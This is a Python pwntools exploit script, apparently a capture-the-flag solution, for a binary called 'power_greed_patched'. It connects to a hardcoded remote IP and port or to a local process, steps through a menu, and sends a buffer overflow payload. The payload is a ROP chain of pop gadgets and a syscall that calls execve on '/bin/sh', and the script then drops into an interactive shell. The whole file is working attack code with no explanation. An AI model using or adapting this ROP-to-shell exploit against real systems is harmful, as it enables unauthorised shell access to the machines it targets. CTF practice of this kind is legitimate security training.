#!/usr/bin/env python3

from pwn import *

e = ELF("./power_greed_patched")
# libc = elf('./libc.so.6')
# rop = ROP(e)

context.binary = e
context.terminal = ['tmux', 'split', '-h']


def conn():
    if args.LOCAL:
        r = process([e.path])
    elif args.GDB:
          # TODO: add break points, e.g. b *(_main + 0x12)
        r = gdb.debug([e.path], '''
                      b *(vuln_scan+0x182)
                      c
                      ''')
    else:
        r = remote("154.57.164.81", 31161)

    return r


def main():
    r = conn()

    r.sendlineafter(b'shell>', b'1')
    r.sendlineafter(b'shell>', b'1')
    r.sendlineafter(b'(y/n)', b'y')
    e.address = 0x400000
    rop = ROP(e)
    # success(rop.gadgets)
    pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]
    # pop_rdx = rop.find_gadget(['pop rdx', 'ret 6'])[0] # Cannot be found by ROP in pwntools
    pop_rdx = next(e.search(asm('pop rdx; ret 6')))
    pop_rsi = rop.find_gadget(['pop rsi', 'pop rbp', 'ret'])[0]
    pop_rdi = rop.find_gadget(['pop rdi', 'pop rbp', 'ret'])[0]
    syscall = rop.find_gadget(['syscall'])[0]
    bin_sh = next(e.search(b'/bin/sh'))
    payload = flat({
        56: [
            pop_rdx, 0,
            pop_rax, b'\x90' * 6, 59,
            pop_rsi, 0, 0,
            pop_rdi, bin_sh, 0,
            syscall,
             ],
        }, filler=b'\x90')
    r.sendlineafter(b'buffer:', payload)

    r.interactive()

if __name__ == "__main__":
    main()
